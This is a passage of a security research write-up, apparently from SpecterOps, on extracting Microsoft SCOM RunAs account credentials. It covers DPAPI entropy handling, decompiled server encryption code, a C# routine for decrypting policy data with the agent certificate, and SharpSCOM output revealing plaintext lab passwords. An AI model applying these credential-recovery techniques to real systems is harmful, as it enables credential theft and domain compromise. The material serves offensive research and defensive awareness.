</span></span><span class=line><span class=cl> <span class=nx>__</span><span class=p>)</span> <span class=o>|</span> <span class=o>|</span> <span class=p>(</span><span class=nx>_</span><span class=o>|</span> <span class=o>|</span>  <span class=o>|</span><span class=nx>_</span><span class=p>)</span> <span class=o>|</span><span class=nx>_</span><span class=o>/</span> <span class=o>|</span>  <span class=err>/--\ |  _|_</span>
</span></span><span class=line><span class=cl>                <span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=nx>v1</span><span class=mf>.11.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Action</span><span class=o>:</span> <span class=nx>Describe</span> <span class=nx>DPAPI</span> <span class=nx>blob</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>guidMasterKey</span>    <span class=o>:</span> <span class=p>{</span><span class=mi>90226</span><span class=nx>a7d</span><span class=o>-</span><span class=mi>5440</span><span class=o>-</span><span class=mi>4498</span><span class=o>-</span><span class=mi>8631</span><span class=o>-</span><span class=mi>8</span><span class=nx>b8f39292ebc</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>size</span>             <span class=o>:</span> <span class=mi>1318</span>
</span></span><span class=line><span class=cl>    <span class=nx>flags</span>            <span class=o>:</span> <span class=mh>0x14</span>
</span></span><span class=line><span class=cl>    <span class=nx>algHash</span><span class=o>/</span><span class=nx>algCrypt</span> <span class=o>:</span> <span class=mi>32782</span> <span class=p>(</span><span class=nx>CALG_SHA_512</span><span class=p>)</span> <span class=o>/</span> <span class=mi>26128</span> <span class=p>(</span><span class=nx>CALG_AES_256</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>description</span>      <span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>dec</span><span class=p>(</span><span class=nx>blob</span><span class=p>)</span>        <span class=o>:</span> <span class=nx>F7</span> <span class=nx>B9</span> <span class=mi>79</span> <span class=nx>E3</span> <span class=mi>38</span> <span class=nx>BB</span> <span class=mi>4</span><span class=nx>D</span> <span class=mi>46</span> <span class=mi>07</span> <span class=mi>8</span><span class=nx>F</span> <span class=nx>C9</span> <span class=nx>A1</span> <span class=nx>EF</span> <span class=mi>98</span> <span class=mi>5</span><span class=nx>B</span> <span class=mi>44</span> <span class=mi>36</span> <span class=nx>BC</span> <span class=nx>CA</span> <span class=mi>3</span><span class=nx>A</span> <span class=mi>7</span><span class=nx>D</span> <span class=nx>B7</span> <span class=nx>DB</span> <span class=mi>15</span> <span class=mi>33</span> <span class=mi>31</span> <span class=mi>70</span> <span class=mi>8</span><span class=nx>D</span> <span class=nx>F1</span> <span class=mi>89</span> <span class=nx>A8</span> <span class=nx>A2</span> <span class=mi>85</span> <span class=mi>61</span> <span class=mi>6</span><span class=nx>A</span> <span class=nx>E6</span> <span class=nx>AA</span> <span class=mi>9</span><span class=nx>B</span> <span class=mi>27</span> <span class=mi>6</span><span class=nx>A</span> <span class=nx>EE</span> <span class=nx>B8</span> <span class=nx>B9</span> <span class=mi>7</span><span class=nx>F</span> <span class=nx>B4</span> <span class=nx>D3</span> <span class=nx>EC</span> <span class=mi>93</span> <span class=nx>E4</span> <span class=mi>8</span><span class=nx>D</span> <span class=mi>5</span><span class=nx>B</span> <span class=nx>AE</span> <span class=nx>E2</span> <span class=mi>66</span> <span class=mi>62</span> <span class=mi>12</span> <span class=mi>18</span> <span class=mi>63</span> <span class=mi>98</span> <span class=nx>E4</span> <span class=mi>5</span><span class=nx>F</span> <span class=mi>6</span><span class=nx>D</span> <span class=mi>57</span> <span class=nx>DA</span> <span class=mi>8</span><span class=nx>E</span> <span class=nx>BF</span> <span class=mi>4</span><span class=nx>A</span> <span class=nx>C5</span> <span class=mi>06</span> <span class=mi>17</span> <span class=mi>37</span> <span class=mi>21</span> <span class=nx>B0</span> <span class=nx>DD</span> <span class=mi>82</span> <span class=nx>F3</span> <span class=mi>29</span> <span class=mi>79</span> <span class=mi>89</span> <span class=nx>F8</span>
</span></span></code></pre></div><p>Although the SCOM agent is a native binary, many of the server-side components on the SCOM server are written in .NET, allowing for decompilation. Searching the decompiled server binaries for references to DPAPI, we located the method <code>Encrypt</code> inside the <code>DPAPIWrapper.cs</code> class within the <code>Microsoft.EnterpriseManagement.DataAccessService.Core.dll</code> dynamic link library (DLL).</p><p>Here, we observe a random data buffer being allocated prior to the call to <code>CryptProtectData</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=n>Random</span> <span class=n>random</span> <span class=p>=</span> <span class=k>new</span> <span class=n>Random</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kt>byte</span><span class=p>[]</span> <span class=n>array</span> <span class=p>=</span> <span class=k>new</span> <span class=kt>byte</span><span class=p>[</span><span class=m>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>random</span><span class=p>.</span><span class=n>NextBytes</span><span class=p>(</span><span class=n>array</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>Marshal</span><span class=p>.</span><span class=n>Copy</span><span class=p>(</span><span class=n>array</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=n>data_BLOB3</span><span class=p>.</span><span class=n>pbData</span><span class=p>,</span> <span class=m>1024</span><span class=p>);</span>
</span></span></code></pre></div><p>This data buffer is then provided as the third argument to the <code>CryptProtectData</code> call.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=k>if</span> <span class=p>(!</span><span class=n>DPAPIWrapper</span><span class=p>.</span><span class=n>CryptProtectData</span><span class=p>(</span><span class=k>ref</span> <span class=n>data_BLOB</span><span class=p>,</span> <span class=s>&#34;&#34;</span><span class=p>,</span> <span class=k>ref</span> <span class=n>data_BLOB3</span><span class=p>,</span> <span class=n>IntPtr</span><span class=p>.</span><span class=n>Zero</span><span class=p>,</span> <span class=k>ref</span> <span class=n>cryptprotect_PROMPTSTRUCT</span><span class=p>,</span> <span class=n>num2</span><span class=p>,</span> <span class=k>ref</span> <span class=n>data_BLOB2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>throw</span> <span class=k>new</span> <span class=n>Win32Exception</span><span class=p>(</span><span class=n>Marshal</span><span class=p>.</span><span class=n>GetLastWin32Error</span><span class=p>());</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span></code></pre></div><p>Reviewing the <a href=https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata>documentation</a>, we see this corresponds to the <code>OptionalEntropy</code> argument.</p><p><img alt=image.png loading=lazy src=/scom/image%202.png></p><p>After the call to <code>CryptProtectData</code>, this random data is then appended to the encrypted data to form the final blob.</p><blockquote><p>Special thanks to our resident DPAPI master Lee Chagolla-Christensen for helping us work this out!</p></blockquote><p>With this discovery, we added logic to perform the correct decryption by extracting the entropy data from the blob into our C# based tool <code>SharpSCOM</code>. If we have local admin rights and RunAs credentials are distributed to the endpoint, we will recover them in plaintext.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>PS</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>domainadmin</span><span class=o>&gt;</span> <span class=p>.</span><span class=err>\</span><span class=nx>SharpSCOM</span><span class=p>.</span><span class=nx>exe</span> <span class=nx>DecryptRunAs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>█▀</span> <span class=err>█</span> <span class=err>█</span> <span class=err>▄▀█</span> <span class=err>█▀█</span> <span class=err>█▀█</span> <span class=err>█▀</span> <span class=err>█▀▀</span> <span class=err>█▀█</span> <span class=err>█▀▄▀█</span>
</span></span><span class=line><span class=cl><span class=err>▄█</span> <span class=err>█▀█</span> <span class=err>█▀█</span> <span class=err>█▀▄</span> <span class=err>█▀▀</span> <span class=err>▄█</span> <span class=err>█▄▄</span> <span class=err>█▄█</span> <span class=err>█</span> <span class=err>▀</span> <span class=err>█</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Author</span><span class=o>:</span> <span class=nx>Matt</span> <span class=nx>Johnson</span> <span class=o>-</span> <span class=nx>SpecterOps</span> <span class=o>-</span> <span class=nx>v0</span><span class=mf>.0.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Searching</span> <span class=k>for</span> <span class=nx>RunAs</span> <span class=nx>credentials</span> <span class=nx>within</span> <span class=nx>the</span> <span class=nx>registry</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Found</span> <span class=mi>3</span> <span class=nx>credentials</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Username</span><span class=o>:</span> <span class=nx>ludus</span><span class=err>\</span><span class=nx>opsmgr_action</span>
</span></span><span class=line><span class=cl>    <span class=nx>Password</span><span class=o>:</span> <span class=nx>Password123</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Username</span><span class=o>:</span> <span class=nx>ludus</span><span class=err>\</span><span class=nx>opsmgr_dataread</span>
</span></span><span class=line><span class=cl>    <span class=nx>Password</span><span class=o>:</span> <span class=nx>Password123</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Username</span><span class=o>:</span> <span class=nx>ludus</span><span class=err>\</span><span class=nx>opsmgr_datawrite</span>
</span></span><span class=line><span class=cl>    <span class=nx>Password</span><span class=o>:</span> <span class=nx>Password123</span>
</span></span></code></pre></div><h3 id=recovery-via-policy-file>Recovery via Policy File<a hidden class=anchor aria-hidden=true href=#recovery-via-policy-file>#</a></h3><p>An alternative option to using DPAPI is to decrypt the the RunAs credentials directly from the agent policy file itself. When the agent receives its initial policy configuration file, the policy XML data is written to disk at the below location <code>C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Connector Configuration Cache\$MANAGEMENT_GROUP$\OpsMgrConnector.Config</code>.</p><p><img alt=image001.png loading=lazy src=/scom/c8505c20-9829-437f-be85-72e1fbed09cf.png></p><p>Of particular interest to us is the <code>SecureData</code> section of the policy shown below.</p><p><img alt=image002.png loading=lazy src=/scom/image002.png></p><p>If RunAs credentials are distributed to the endpoint, they will be included within the <code>SecureData</code> section encrypted with the agent’s public key (stored on the SCOM management server). The corresponding agent private key is stored on the agent in the local certificate store under <code>Local Computer\Microsoft Monitoring Agent</code>.</p><p><img alt=image.png loading=lazy src=/scom/a1fdb83a-af6e-4912-93f3-b3c38a16ab0e.png></p><p>As an alternative to DPAPI decryption, we can reference this certificate and use the associated private key to decrypt the <code>SecureData</code> section of the policy. All that is required it to determine the algorithm used for encryption.</p><p>Searching the decompiled server binaries for references to encryption, we located the method <code>EncryptBytes</code> inside the <code>RootConnectorMethods.cs</code> Class within the <code>Microsoft.EnterpriseManagement.RuntimeService.dll</code> DLL.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl>		<span class=kr>public</span> <span class=kr>static</span> <span class=kr>byte</span><span class=p>[]</span> <span class=nx>EncryptBytes</span><span class=p>(</span><span class=kr>byte</span><span class=p>[]</span> <span class=nx>certificateBlob</span><span class=p>,</span> <span class=kr>byte</span><span class=p>[]</span> <span class=nx>message</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=kr>byte</span><span class=p>[]</span> <span class=nx>array3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>try</span>
</span></span><span class=line><span class=cl>			<span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=k>if</span> <span class=p>(</span><span class=nx>TraceHelper</span><span class=p>.</span><span class=nx>traceProvider</span><span class=p>.</span><span class=nx>Level</span> <span class=o>&gt;=</span> <span class=mi>6</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>TraceHelper</span><span class=p>.</span><span class=nx>traceProvider</span><span class=p>.</span><span class=nx>Flags</span> <span class=o>&amp;</span> <span class=mi>256</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=nx>WPP_1d8ce350b791d902da3ec4db6c045231</span><span class=p>.</span><span class=nx>WPP_NOARGS</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>36</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=nx>uint</span> <span class=nx>num</span> <span class=o>=</span> <span class=nx>BitConverter</span><span class=p>.</span><span class=nx>ToUInt32</span><span class=p>(</span><span class=nx>certificateBlob</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=kr>byte</span><span class=p>[]</span> <span class=nx>array</span> <span class=o>=</span> <span class=k>new</span> <span class=kr>byte</span><span class=p>[</span><span class=nx>certificateBlob</span><span class=p>.</span><span class=nx>Length</span> <span class=o>-</span> <span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>				<span class=nb>Array</span><span class=p>.</span><span class=nx>Copy</span><span class=p>(</span><span class=nx>certificateBlob</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=nx>array</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>array</span><span class=p>.</span><span class=nx>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=nx>X509Certificate2</span> <span class=nx>x509Certificate</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>X509Certificate2</span><span class=p>(</span><span class=nx>array</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=k>if</span> <span class=p>(</span><span class=nx>num</span> <span class=o>!=</span> <span class=mi>26128</span><span class=nx>U</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=k>if</span> <span class=p>(</span><span class=nx>TraceHelper</span><span class=p>.</span><span class=nx>traceProvider</span><span class=p>.</span><span class=nx>Level</span> <span class=o>&gt;=</span> <span class=mi>3</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>TraceHelper</span><span class=p>.</span><span class=nx>traceProvider</span><span class=p>.</span><span class=nx>Flags</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>					<span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=nx>WPP_1d8ce350b791d902da3ec4db6c045231</span><span class=p>.</span><span class=nx>WPP_uss</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=nx>num</span><span class=p>,</span> <span class=nx>TraceProvider</span><span class=p>.</span><span class=nx>MakeStringArg</span><span class=p>(</span><span class=nx>x509Certificate</span><span class=p>.</span><span class=nx>Subject</span><span class=p>),</span> <span class=nx>TraceProvider</span><span class=p>.</span><span class=nx>MakeStringArg</span><span class=p>(</span><span class=nx>x509Certificate</span><span class=p>.</span><span class=nx>SerialNumber</span><span class=p>));</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=nx>num</span> <span class=o>=</span> <span class=mi>26128</span><span class=nx>U</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=nx>using</span> <span class=p>(</span><span class=nx>SymmetricAlgorithm</span> <span class=nx>symmetricAlgorithm</span> <span class=o>=</span> <span class=nx>SymmetricAlgorithm</span><span class=p>.</span><span class=nx>Create</span><span class=p>(</span><span class=s2>&#34;AES&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>				<span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=nx>symmetricAlgorithm</span><span class=p>.</span><span class=nx>KeySize</span> <span class=o>=</span> <span class=mi>256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>					<span class=nx>symmetricAlgorithm</span><span class=p>.</span><span class=nx>BlockSize</span> <span class=o>=</span> <span class=mi>128</span><span class=p>;</span>
</span></span><span class=line><span class=cl>					<span class=nx>symmetricAlgorithm</span><span class=p>.</span><span class=nx>Mode</span> <span class=o>=</span> <span class=nx>CipherMode</span><span class=p>.</span><span class=nx>CBC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>					<span class=nx>symmetricAlgorithm</span><span class=p>.</span><span class=nx>IV</span> <span class=o>=</span> <span class=k>new</span> <span class=kr>byte</span><span class=p>[</span><span class=nx>symmetricAlgorithm</span><span class=p>.</span><span class=nx>BlockSize</span> <span class=o>/</span> <span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>					<span class=nx>using</span> <span class=p>(</span><span class=nx>ICryptoTransform</span> <span class=nx>cryptoTransform</span> <span class=o>=</span> <span class=nx>symmetricAlgorithm</span><span class=p>.</span><span class=nx>CreateEncryptor</span><span class=p>())</span>
</span></span><span class=line><span class=cl>					<span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=kr>byte</span><span class=p>[]</span> <span class=nx>array2</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>RSAPKCS1KeyExchangeFormatter</span><span class=p>(</span><span class=nx>x509Certificate</span><span class=p>.</span><span class=nx>PublicKey</span><span class=p>.</span><span class=nx>Key</span><span class=p>).</span><span class=nx>CreateKeyExchange</span><span class=p>(</span><span class=nx>symmetricAlgorithm</span><span class=p>.</span><span class=nx>Key</span><span class=p>,</span> <span class=nx>symmetricAlgorithm</span><span class=p>.</span><span class=nx>GetType</span><span class=p>());</span>
</span></span><span class=line><span class=cl>						<span class=nx>using</span> <span class=p>(</span><span class=nx>MemoryStream</span> <span class=nx>memoryStream</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>MemoryStream</span><span class=p>())</span>
</span></span><span class=line><span class=cl>						<span class=p>{</span>
</span></span><span class=line><span class=cl>							<span class=nx>using</span> <span class=p>(</span><span class=nx>BinaryWriter</span> <span class=nx>binaryWriter</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>BinaryWriter</span><span class=p>(</span><span class=nx>memoryStream</span><span class=p>))</span>
</span></span><span class=line><span class=cl>							<span class=p>{</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=mi>12</span> <span class=o>+</span> <span class=nx>array2</span><span class=p>.</span><span class=nx>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=nx>num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=mi>41984</span><span class=nx>U</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nb>Array</span><span class=p>.</span><span class=nx>Reverse</span><span class=p>(</span><span class=nx>array2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=nx>array2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>array2</span><span class=p>.</span><span class=nx>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>								<span class=nx>binaryWriter</span><span class=p>.</span><span class=nx>Flush</span><span class=p>();</span>
</span></span><span class=line><span class=cl>								<span class=nx>using</span> <span class=p>(</span><span class=nx>CryptoStream</span> <span class=nx>cryptoStream</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>CryptoStream</span><span class=p>(</span><span class=nx>memoryStream</span><span class=p>,</span> <span class=nx>cryptoTransform</span><span class=p>,</span> <span class=nx>CryptoStreamMode</span><span class=p>.</span><span class=nx>Write</span><span class=p>))</span>
</span></span><span class=line><span class=cl>								<span class=p>{</span>
</span></span><span class=line><span class=cl>									<span class=nx>cryptoStream</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=nx>message</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>message</span><span class=p>.</span><span class=nx>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>									<span class=nx>cryptoStream</span><span class=p>.</span><span class=nx>FlushFinalBlock</span><span class=p>();</span>
</span></span><span class=line><span class=cl>								<span class=p>}</span>
</span></span><span class=line><span class=cl>								<span class=nx>array3</span> <span class=o>=</span> <span class=nx>memoryStream</span><span class=p>.</span><span class=nx>ToArray</span><span class=p>();</span>
</span></span><span class=line><span class=cl>							<span class=p>}</span>
</span></span><span class=line><span class=cl>						<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span></code></pre></div><p>This function will read the agent certificate from the SCOM database as <code>certificateBlob</code>, and use the associated public key to encrypt the <code>SecureData</code> section of the policy. Although we don’t have access to decompiled code responsible for decryption (as this is performed by the agent in the native SCOM binaries), implementing a corresponding decryption routine for this function is straightforward.</p><pre tabindex=0><code>using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

public byte[] DecryptWithCertificate(byte[] encryptedData, string certSubjectName)
{
    // Open the Local Machine certificate store
    X509Store store = new X509Store(StoreName.My, StoreLocation.LocalMachine);
    store.Open(OpenFlags.ReadOnly);

    try
    {
        // Find certificate by subject name
        X509Certificate2Collection certs = store.Certificates.Find(
            X509FindType.FindBySubjectName,
            certSubjectName,
            false); // false = include invalid certs

        if (certs.Count == 0)
            throw new Exception($&#34;Certificate &#39;{certSubjectName}&#39; not found&#34;);

        X509Certificate2 cert = certs[0];

        // Verify private key is available
        if (!cert.HasPrivateKey)
            throw new Exception(&#34;Certificate does not have a private key&#34;);

        // Get RSA private key
        using (RSA rsa = cert.GetRSAPrivateKey())
        {
            // Decrypt data
            byte[] decryptedData = rsa.Decrypt(encryptedData, RSAEncryptionPadding.Pkcs1);
            return decryptedData;
        }
    }
    finally
    {
        store.Close();
    }
}
</code></pre><p>We can then add this functionality into <code>SharpSCOM</code> which will automatically locate the RunAs certificate from the <code>Microsoft Monitoring Agent</code> store and use this to decrypt the <code>SecureData</code> blob.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>PS</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>domainadmin</span><span class=err>\</span><span class=nx>Documents</span><span class=o>&gt;</span> <span class=p>.</span><span class=err>\</span><span class=nx>SharpSCOM</span><span class=p>.</span><span class=nx>exe</span> <span class=nx>decryptpolicy</span> <span class=o>/</span><span class=nx>data</span><span class=o>:</span><span class=nx>DAEAAAECAAAQZgAAA</span><span class=p>&lt;</span><span class=nt>TRIMMED</span> <span class=na>FOR</span> <span class=na>BREVITY</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>█▀</span> <span class=err>█</span> <span class=err>█</span> <span class=err>▄▀█</span> <span class=err>█▀█</span> <span class=err>█▀█</span> <span class=err>█▀</span> <span class=err>█▀▀</span> <span class=err>█▀█</span> <span class=err>█▀▄▀█</span>
</span></span><span class=line><span class=cl><span class=err>▄█</span> <span class=err>█▀█</span> <span class=err>█▀█</span> <span class=err>█▀▄</span> <span class=err>█▀▀</span> <span class=err>▄█</span> <span class=err>█▄▄</span> <span class=err>█▄█</span> <span class=err>█</span> <span class=err>▀</span> <span class=err>█</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Author</span><span class=o>:</span> <span class=nx>Matt</span> <span class=nx>Johnson</span> <span class=o>-</span> <span class=nx>SpecterOps</span> <span class=o>-</span> <span class=nx>v0</span><span class=mf>.0.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Found</span> <span class=nx>certificate</span> <span class=k>in</span> <span class=nx>Microsoft</span> <span class=nx>Monitoring</span> <span class=nx>Agent</span> <span class=nx>store</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Subject</span><span class=o>:</span> <span class=nx>O</span><span class=o>=</span><span class=nx>Microsoft</span><span class=p>,</span> <span class=nx>OU</span><span class=o>=</span><span class=nx>RunAs</span> <span class=nx>Account</span> <span class=nx>Encryption</span><span class=p>,</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>DC01</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Issuer</span><span class=o>:</span> <span class=nx>O</span><span class=o>=</span><span class=nx>Microsoft</span><span class=p>,</span> <span class=nx>OU</span><span class=o>=</span><span class=nx>RunAs</span> <span class=nx>Account</span> <span class=nx>Encryption</span><span class=p>,</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>DC01</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Thumbprint</span><span class=o>:</span> <span class=mi>962</span><span class=nx>D0B73F8F7040C3C579C0CC5262EA582A8B218</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Key</span> <span class=nx>Container</span><span class=o>:</span> <span class=nx>a7234bac</span><span class=o>-</span><span class=mi>3179</span><span class=o>-</span><span class=mi>4607</span><span class=o>-</span><span class=nx>ba67</span><span class=o>-</span><span class=mi>8</span><span class=nx>f6143c9344e</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Provider</span><span class=o>:</span> <span class=nx>Microsoft</span> <span class=nx>Software</span> <span class=nx>Key</span> <span class=nx>Storage</span> <span class=nx>Provider</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Key</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>2048</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>RSA</span> <span class=nx>key</span> <span class=nx>loaded</span> <span class=nx>successfully</span> <span class=nx>from</span> <span class=nx>certificate</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>SecureStorageContainer</span><span class=p>&gt;&lt;</span><span class=nt>SecureStorageReferences</span><span class=p>&gt;&lt;</span><span class=nt>Added</span> <span class=p>/&gt;&lt;</span><span class=nt>Removed</span> <span class=p>/&gt;&lt;</span><span class=nt>Modified</span> <span class=p>/&gt;&lt;/</span><span class=nt>SecureStorageReferences</span><span class=p>&gt;&lt;</span><span class=nt>SecureStorageElements</span><span class=p>&gt;&lt;</span><span class=nt>Added</span><span class=p>&gt;&lt;</span><span class=nt>SecureStorageElement</span> <span class=na>Type</span><span class=o>=</span><span class=s>&#34;WindowsCredential&#34;</span><span class=p>&gt;&lt;</span><span class=nt>SSID</span><span class=p>&gt;</span><span class=mi>00</span><span class=nx>C29753F0583B2A1D9D0D81DF24F0FBA31D72B17A00000000000000000000000000000000000000</span><span class=p>&lt;/</span><span class=nt>SSID</span><span class=p>&gt;&lt;</span><span class=nt>Domain</span><span class=p>&gt;</span><span class=nx>ludus</span><span class=p>&lt;/</span><span class=nt>Domain</span><span class=p>&gt;&lt;</span><span class=nt>UserName</span><span class=p>&gt;</span><span class=nx>runas_account</span><span class=p>&lt;/</span><span class=nt>UserName</span><span class=p>&gt;&lt;</span><span class=nt>Password</span><span class=p>&gt;</span><span class=nx>UwB1AHAAZQByAFMAZQBjAHUAcgBlACEA</span><span class=p>&lt;/</span><span class=nt>Password</span><span class=p>&gt;&lt;/</span><span class=nt>SecureStorageElement</span><span class=p>&gt;&lt;/</span><span class=nt>Added</span><span class=p>&gt;&lt;</span><span class=nt>Removed</span> <span class=p>/&gt;&lt;</span><span class=nt>Modified</span> <span class=p>/&gt;&lt;/</span><span class=nt>SecureStorageElements</span><span class=p>&gt;&lt;/</span><span class=nt>SecureStorageContainer</span><span class=p>&gt;</span>
